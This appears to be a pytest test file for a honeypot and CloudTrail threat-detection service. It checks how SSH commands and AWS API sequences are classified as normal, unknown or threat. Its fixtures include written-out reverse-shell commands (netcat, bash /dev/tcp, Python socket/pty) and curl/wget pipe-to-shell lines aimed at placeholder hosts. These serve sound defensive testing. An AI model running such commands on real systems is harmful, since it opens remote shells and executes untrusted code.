from datetime import UTC, datetime, timedelta
from importlib.resources import files

import pytest
import yaml
from pydantic import ValidationError

from app.services.public_detection import (
    PublicSession,
    compile_public_rules,
    evaluate_public_session,
    public_rule_policies,
    public_sigma_engine,
)
from app.services.sigma import get_sigma_engine

START = datetime(2026, 1, 1, tzinfo=UTC)


def ssh(identifier, kind="cowrie.command.input", command=None, offset=0, connection="one", **extra):
    return {
        "id": identifier,
        "timestamp": START + timedelta(seconds=offset),
        "kind": kind,
        "command": command,
        "connection_id": connection,
        **extra,
    }


def aws(identifier, action="GetObject", resource="object-one", offset=0, **extra):
    return {
        "id": identifier,
        "timestamp": START + timedelta(seconds=offset),
        "kind": "AwsApiCall",
        "api_service": "s3.amazonaws.com",
        "api_action": action,
        "principal_hash": "actor",
        "resource_hashes": [resource],
        "outcome": "success",
        **extra,
    }


def detect(events, source="cowrie"):
    return evaluate_public_session(
        {"source": source, "original_group_id": "fixture", "events": events}
    )


def routine(command="whoami"):
    return [
        ssh("login", "cowrie.login.success"),
        ssh("cmd", command=command, offset=1),
        ssh("closed", "cowrie.session.closed", offset=2),
    ]


def test_rules_are_isolated_from_existing_approved_package():
    assert len(public_sigma_engine().summaries()) == 5
    assert len(get_sigma_engine().summaries()) == 6
    assert public_sigma_engine().valid


def test_observed_normal_activity_does_not_require_project_proof():
    result = detect(routine())
    assert result["verdict"] == "normal"
    assert result["missing_fields"] == []
    assert result["enforcement_eligible"] is False
    assert result["authority"] == "reference_only"


def test_failed_login_does_not_make_routine_commands_authenticated():
    events = routine()
    events[0]["kind"] = "cowrie.login.failed"
    assert detect(events)["verdict"] == "unknown"
    assert detect([ssh("failed", "cowrie.login.failed"), *routine()])["verdict"] == "normal"


@pytest.mark.parametrize(
    "command",
    [
        "echo `wget https://example.invalid/a`",
        "echo $(wget https://example.invalid/a)",
        "echo ok\nwhoami",
        "cat <(wget https://example.invalid/a)",
        "some-unknown-program",
    ],
)
def test_unsupported_shell_constructs_remain_unknown(command):
    assert detect(routine(command))["verdict"] == "unknown"


def test_quoted_command_text_is_not_executed_or_matched():
    result = detect(routine("echo 'nc attacker.invalid 4444 -e /bin/sh'"))
    assert result["verdict"] == "normal"
    assert result["evidence_ids"] == []
    assert detect(routine("sh -c 'echo /dev/tcp/example.invalid/4444'"))["verdict"] == "unknown"
    assert (
        detect(routine("python3 -c 'print(\"socket.socket(); os.dup2()\")'"))["verdict"]
        == "unknown"
    )


@pytest.mark.parametrize(
    "command",
    [
        "nc attacker.invalid 4444 -e /bin/sh",
        "bash -i >& /dev/tcp/example.invalid/4444 0>&1",
        "sh -c 'bash -i >& /dev/tcp/example.invalid/4444 0>&1'",
        "sh -c 'nc attacker.invalid 4444 -e /bin/sh'",
        (
            "python3 -c 'import socket,os,pty; s=socket.socket(); "
            's.connect(("peer.invalid",4444)); os.dup2(s.fileno(),0); '
            'os.dup2(s.fileno(),1); pty.spawn("/bin/sh")\''
        ),
    ],
)
def test_reverse_shell_attempt_is_reference_only(command):
    result = detect([ssh("attempt", command=command)])
    assert result["verdict"] == "threat"
    assert result["features"]["ssh_reverse_shell"] is True
    assert result["evidence_ids"] == ["attempt"]
    assert result["enforcement_eligible"] is False


def test_failure_burst_uses_observed_time_window():
    events = [ssh(str(index), "cowrie.login.failed", offset=index * 15) for index in range(5)]
    assert detect(events)["features"]["ssh_auth_burst"] is True
    events[-1]["timestamp"] += timedelta(seconds=1)
    assert detect(events)["verdict"] == "unknown"


def test_download_then_execution_keeps_equal_timestamp_source_order():
    events = [
        ssh("z", command="wget https://example.invalid/run -O /tmp/run"),
        ssh("a", command="sh /tmp/run"),
    ]
    result = detect(events)
    assert result["features"]["ssh_download_execute"] is True
    assert result["evidence_ids"] == []
    assert result["candidate_evidence_ids"] == ["a", "z"]
    assert result["verdict"] == "unknown"
    assert detect(list(reversed(events)))["verdict"] == "unknown"


def test_download_cannot_join_another_connection_or_invent_start_directory():
    events = [
        ssh("download", command="wget https://example.invalid/run -O run"),
        ssh("execute", command="./run", offset=1, connection="another"),
    ]
    assert detect(events)["verdict"] == "unknown"
    events[1]["connection_id"] = "one"
    events[1]["command"] = "/run"
    assert detect(events)["verdict"] == "unknown"
    events[1]["command"] = "./run"
    result = detect(events)
    assert result["verdict"] == "unknown"
    assert result["investigation_required"] is True


def test_download_failure_and_execute_is_reported_as_attempt_not_success():
    events = [
        ssh("download", command="curl https://example.invalid/run -o /tmp/run"),
        ssh("failed", "cowrie.command.failed", command="curl", offset=1, outcome="failure"),
        ssh("execute", command="/tmp/run", offset=2),
    ]
    result = detect(events)
    assert result["verdict"] == "unknown"
    assert result["investigation_required"] is True
    assert "attempts" in result["interpretation"]
    assert "successful compromise" in result["interpretation"]
    assert result["enforcement_eligible"] is False


def test_missing_and_unsupported_activity_never_default_to_normal():
    assert detect([ssh("no-command", command=None)])["verdict"] == "unknown"
    assert detect(routine()[:-1])["verdict"] == "unknown"
    assert detect([aws("a", outcome="unknown")], "cloudtrail")["verdict"] == "unknown"
    assert detect([aws("a", action="UnobservedAction")], "cloudtrail")["verdict"] == "unknown"
    assert detect([aws("a", resource_hashes=[])], "cloudtrail")["verdict"] == "unknown"


def test_cloud_normal_is_observed_success_with_actor_and_resource():
    assert detect([aws("one")], "cloudtrail")["verdict"] == "normal"
    assert detect([aws("one", principal_hash=None)], "cloudtrail")["verdict"] == "unknown"
    assert (
        detect([aws("one", outcome="failure", error_code="AccessDenied")], "cloudtrail")["verdict"]
        == "unknown"
    )


def test_cloud_identity_sequence_requires_target_actor_order_and_time():
    events = [
        aws(str(index), action=action, offset=index * 300, api_service="iam.amazonaws.com")
        for index, action in enumerate(["CreateUser", "CreateAccessKey", "AttachUserPolicy"])
    ]
    assert detect(events, "cloudtrail")["features"]["cloud_identity_chain"] is True
    events[-1]["timestamp"] += timedelta(seconds=1)
    assert detect(events, "cloudtrail")["verdict"] == "unknown"
    events[-1]["timestamp"] -= timedelta(seconds=1)
    events[-1]["resource_hashes"] = ["different-user"]
    assert detect(events, "cloudtrail")["verdict"] == "unknown"
    events[-1]["resource_hashes"] = ["object-one"]
    events[-1]["principal_hash"] = "different-actor"
    assert detect(events, "cloudtrail")["verdict"] == "unknown"


def test_cloud_burst_requires_operations_and_distinct_targets_in_one_window():
    events = [
        aws(str(index), resource=f"object-{index % 20}", offset=index / 2) for index in range(100)
    ]
    assert detect(events, "cloudtrail")["features"]["cloud_object_burst"] is True
    assert detect(events[:-1], "cloudtrail")["verdict"] == "normal"
    for event in events:
        event["resource_hashes"] = [f"alias-{index}" for index in range(20)]
    assert detect(events, "cloudtrail")["features"]["cloud_object_burst"] is False
    for index, event in enumerate(events):
        event["resource_hashes"] = [f"object-{index}"]
        event["timestamp"] = START + timedelta(seconds=index)
    assert detect(events, "cloudtrail")["features"]["cloud_object_burst"] is False


def test_strict_schema_rejects_labels_duplicates_and_naive_times():
    base = {"source": "cowrie", "original_group_id": "one", "events": routine()}
    with pytest.raises(ValidationError):
        PublicSession.model_validate({**base, "label": "threat"})
    with pytest.raises(ValidationError):
        PublicSession.model_validate({**base, "events": [routine()[0], routine()[0]]})
    event = routine()[0]
    event["timestamp"] = datetime(2026, 1, 1)
    with pytest.raises(ValidationError):
        PublicSession.model_validate({**base, "events": [event]})


@pytest.mark.parametrize(
    "command",
    [
        "systemctl status ssh",
        "systemctl is-active nginx",
        "systemctl show nginx",
        "dmesg | tail",
        "ps aux | head",
        "top -bn1 | head",
        "ss -tlnp",
        "who",
        "du -sh /var/log",
        "tail -n 20 /var/log/auth.log",
        "head /var/log/syslog",
    ],
)
def test_narrow_readonly_profile_accepts_known_passive_cowrie_metadata(command):
    events = routine(command)
    events.insert(1, ssh("params", "cowrie.session.params"))
    events.insert(-1, ssh("log-closed", "cowrie.log.closed", offset=2))
    assert detect(events)["verdict"] == "normal"


@pytest.mark.parametrize(
    "command",
    [
        "/tmp/id",
        "./ls",
        "LD_PRELOAD=/tmp/plugin.so whoami",
        "systemctl restart ssh",
        "dmesg --clear",
        "head",
        "tail",
        "cat -",
        "apt install tool",
        "backup /etc",
    ],
)
def test_mutating_commands_unobserved_inputs_and_shadowed_binary_paths_stay_unknown(command):
    assert detect(routine(command))["verdict"] == "unknown"


@pytest.mark.parametrize(
    "command",
    [
        "curl -s https://example.invalid/run | sh",
        "wget -qO- https://example.invalid/run | bash",
        "sh -c 'curl -s https://example.invalid/run | sh'",
    ],
)
def test_download_to_shell_pipe_is_an_attempt(command):
    result = detect([ssh("pipe", command=command)])
    assert result["features"]["ssh_download_execute"] is True
    assert result["enforcement_eligible"] is False


@pytest.mark.parametrize(
    "command",
    [
        "echo 'curl -s https://example.invalid/run | sh'",
        'curl -s https://example.invalid/run "|" sh',
        "curl -s https://example.invalid/run || sh",
        "curl -s https://example.invalid/run -o /tmp/run | sh",
        "curl -s https://example.invalid/run -o/tmp/run | sh",
        "curl -s https://example.invalid/run | sh /tmp/other",
        "wget https://example.invalid/run | sh",
    ],
)
def test_nonpipe_or_nonstdin_cases_do_not_invent_download_execution(command):
    assert detect([ssh("not-pipe", command=command)])["features"]["ssh_download_execute"] is False


@pytest.mark.parametrize("action", ["PutObject", "DeleteObject", "DeleteObjects"])
def test_unexplained_cloud_mutations_are_unknown_below_burst_threshold(action):
    assert detect([aws("mutation", action=action)], "cloudtrail")["verdict"] == "unknown"


def test_large_bursts_keep_evidence_unique_and_bounded_to_input():
    count = 10001
    events = [aws(str(index), resource=f"object-{index % 20}") for index in range(count)]
    result = detect(events, "cloudtrail")
    assert result["features"]["cloud_object_burst"] is True
    assert len(result["candidate_evidence_ids"]) == count
    assert result["evidence_ids"] == []
    result = detect([ssh(str(index), "cowrie.login.failed") for index in range(count)])
    assert result["features"]["ssh_auth_burst"] is True
    assert len(result["candidate_evidence_ids"]) == count
    assert result["evidence_ids"] == []


@pytest.mark.parametrize("command", ["date --set=2020-01-01", "printf -v variable text"])
def test_mutating_options_are_outside_normal_profile(command):
    assert detect(routine(command))["verdict"] == "unknown"


def test_bad_url_is_inert_and_stdout_download_does_not_invent_local_file():
    assert detect([ssh("url", command="wget http://[")])["verdict"] == "unknown"
    events = [
        ssh("stdout", command="wget -O - https://example.invalid/run"),
        ssh("execute", command="./run", offset=1),
    ]
    assert detect(events)["features"]["ssh_download_execute"] is False


def test_routine_command_requires_authentication_before_and_close_after():
    events = routine()
    events[0]["timestamp"] = START + timedelta(seconds=1.5)
    assert detect(events)["verdict"] == "unknown"
    events = routine()
    events[-1]["timestamp"] = START + timedelta(seconds=0.5)
    assert detect(events)["verdict"] == "unknown"


@pytest.mark.parametrize("action", ["PutObject", "DeleteObject", "GetObject"])
def test_bulk_ordinary_operations_are_investigation_candidates_not_threats(action):
    events = [
        aws(f"event-{index}", action=action, resource=f"object-{index % 20}")
        for index in range(100)
    ]
    result = detect(events, "cloudtrail")
    assert result["verdict"] == "unknown"
    assert result["reason"] == "observed_activity_requires_context"
    assert result["investigation_required"] is True
    assert result["evidence_ids"] == []
    assert result["candidate_evidence_ids"] == sorted(event["id"] for event in events)
    assert result["findings"] == [
        {
            "rule_id": "87588a99-4be9-4c37-97a7-c7d1feb57ffd",
            "feature": "cloud_object_burst",
            "disposition": "investigate",
            "evidence_ids": result["candidate_evidence_ids"],
        }
    ]
    assert result["enforcement_eligible"] is False
    normal = detect([aws("unrelated", action="ListBuckets", resource="bucket")], "cloudtrail")
    assert normal["verdict"] == "normal"
    assert normal["investigation_required"] is False


def test_routine_identity_provisioning_does_not_invent_privilege_violation():
    events = [
        aws(str(index), action=action, offset=index, api_service="iam.amazonaws.com")
        for index, action in enumerate(["CreateUser", "CreateAccessKey", "AttachUserPolicy"])
    ]
    result = detect(events, "cloudtrail")
    assert result["verdict"] == "unknown"
    assert result["investigation_required"] is True
    assert result["evidence_ids"] == []
    assert result["findings"][0]["feature"] == "cloud_identity_chain"


def test_typo_burst_and_installer_do_not_confirm_an_attack():
    events = [ssh(str(index), "cowrie.login.failed") for index in range(5)]
    events += [ssh("download", command="curl https://updates.invalid/install.sh | sh")]
    result = detect(events)
    assert result["verdict"] == "unknown"
    assert result["evidence_ids"] == []
    assert {finding["feature"] for finding in result["findings"]} == {
        "ssh_auth_burst",
        "ssh_download_execute",
    }
    assert all(finding["disposition"] == "investigate" for finding in result["findings"])


def test_candidate_only_evidence_cannot_support_a_separate_threat_finding():
    events = [ssh(str(index), "cowrie.login.failed") for index in range(5)]
    events += [ssh("reverse", command="nc peer.invalid 4444 -e /bin/sh")]
    result = detect(events)
    assert result["verdict"] == "threat"
    assert result["investigation_required"] is True
    assert result["evidence_ids"] == ["reverse"]
    assert result["candidate_evidence_ids"] == [str(index) for index in range(5)]
    assert [finding["rule_id"] for finding in result["findings"]] == sorted(
        finding["rule_id"] for finding in result["findings"]
    )
    for finding in result["findings"]:
        policy = public_rule_policies()[finding["rule_id"]]
        assert finding["feature"] == policy["feature"]
        assert finding["disposition"] == policy["disposition"]


def test_same_event_may_support_two_distinct_findings_without_promoting_other_candidates():
    events = [
        ssh(
            "both",
            command="curl https://updates.invalid/install.sh | sh; nc peer.invalid 4444 -e /bin/sh",
        ),
        ssh("candidate-only", command="curl https://updates.invalid/other.sh | sh"),
    ]
    result = detect(events)
    assert result["evidence_ids"] == ["both"]
    assert result["candidate_evidence_ids"] == ["both", "candidate-only"]
    assert len(result["findings"]) == 2


@pytest.mark.parametrize("mode", ["missing", "unknown_feature", "escalate", "wrong_selector"])
def test_unclassified_or_mismatched_public_rule_never_implicitly_becomes_threat(mode):
    path = files("app.data.public_sigma").joinpath("cloud_object_burst.yml")
    document = yaml.safe_load(path.read_text())
    if mode == "missing":
        document["x_secops"].pop("public_detection")
    elif mode == "unknown_feature":
        document["x_secops"]["public_detection"]["feature"] = "new_unreviewed_feature"
    elif mode == "escalate":
        document["x_secops"]["public_detection"]["disposition"] = "threat"
    else:
        document["detection"]["selection"]["unmapped.public.cloud_object_burst"] = False
    with pytest.raises(ValueError):
        compile_public_rules([("fixture.yml", document)])


@pytest.mark.parametrize(
    "command",
    [
        "nc -e",
        "nc -e /bin/sh",
        "nc --help -e /bin/sh peer.invalid 4444",
        "nc -l -e /bin/sh peer.invalid 4444",
        "nc -e /bin/cat peer.invalid 4444",
        "nc peer.invalid invalid-port -e /bin/sh",
        "bash -i >& /dev/tcp/peer.invalid/99999",
        "python3 -c 'import socket,os; s=socket.socket(); os.dup2(s.fileno(),0)'",
        (
            'python3 -c \'import socket,os; s=socket.socket(); s.connect(("peer.invalid",4444)); '
            "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1)'"
        ),
        (
            "python3 -c 'import socket,os,pty; s=socket.socket(); "
            'os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); pty.spawn("/bin/sh")\''
        ),
        "python3 -c 'if False: socket.socket(); os.dup2(3,0); os.system(\"/bin/sh\")'",
    ],
)
def test_incomplete_remote_shell_snippets_do_not_confirm_a_threat(command):
    result = detect([ssh("partial", command=command)])
    assert result["verdict"] == "unknown"
    assert result["evidence_ids"] == []
    assert result["features"]["ssh_reverse_shell"] is False


@pytest.mark.parametrize(
    "command",
    [
        "bash -i '>' /dev/tcp/peer.invalid/4444",
        "bash -i '>' '/dev/tcp/peer.invalid/4444'",
        "bash -i /dev/tcp/peer.invalid/4444 > /tmp/output",
        "sh -c 'bash -i \"\u003e\" /dev/tcp/peer.invalid/4444'",
        "nc peer.invalid 4444 -e '/bin/sh --help'",
    ],
)
def test_literal_redirection_and_shell_help_are_not_remote_shell_attempts(command):
    result = detect([ssh("literal", command=command)])
    assert result["features"]["ssh_reverse_shell"] is False
    assert result["verdict"] == "unknown"


@pytest.mark.parametrize("port", ["²", "9" * 5000])
def test_non_ascii_or_excessive_port_text_is_data_not_a_parser_error(port):
    assert (
        detect([ssh("port", command=f"nc peer.invalid {port} -e /bin/sh")])["verdict"] == "unknown"
    )
